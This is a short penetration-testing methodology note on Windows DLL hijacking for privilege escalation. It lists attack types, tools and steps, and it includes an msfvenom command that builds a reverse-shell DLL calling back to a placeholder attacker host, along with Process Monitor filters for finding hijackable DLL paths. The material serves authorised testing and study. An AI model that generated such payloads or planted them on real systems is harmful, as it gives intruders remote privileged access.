# DLL Hijacking

## When this applies

- Windows foothold; you have write access to a directory in the DLL search path of a privileged process.
- Goal: load a malicious DLL instead of the legitimate one.

## Attack Types

- **DLL Search Order Hijacking**: Placing DLL in searched directory
- **Phantom DLL Hijacking**: Creating missing DLLs
- **DLL Side-Loading**: Legitimate application loading malicious DLL
- **DLL Injection**: Injecting into running process

## Tools

- Process Monitor (Sysinternals)
- Process Hacker
- DLL Hijack Scanner
- Metasploit msfvenom (DLL generation)

## Testing Methodology

1. Monitor application DLL loading with Process Monitor
2. Identify missing or searched DLLs
3. Check directory write permissions
4. Create malicious DLL
5. Place DLL in hijackable location
6. Trigger application execution

## Example Process

```bash
# Generate malicious DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker LPORT=4444 -f dll -o evil.dll

# Process Monitor filters
Operation: CreateFile
Result: NAME NOT FOUND
Path: ends with .dll

# Common hijackable locations
C:\Windows\System32\
Application directory
Current working directory
%PATH% directories
```

## Verifying success

- Procmon shows the privileged process loading the attacker DLL.
- Payload executes (reverse shell, file write, etc.).

## Common pitfalls

- DLL bitness must match the loading process.
- SafeDllSearchMode reduces hijackable paths — verify with regquery.

## Tools

- Process Monitor (Sysinternals)
- Process Hacker
- DLL Hijack Scanner
- msfvenom
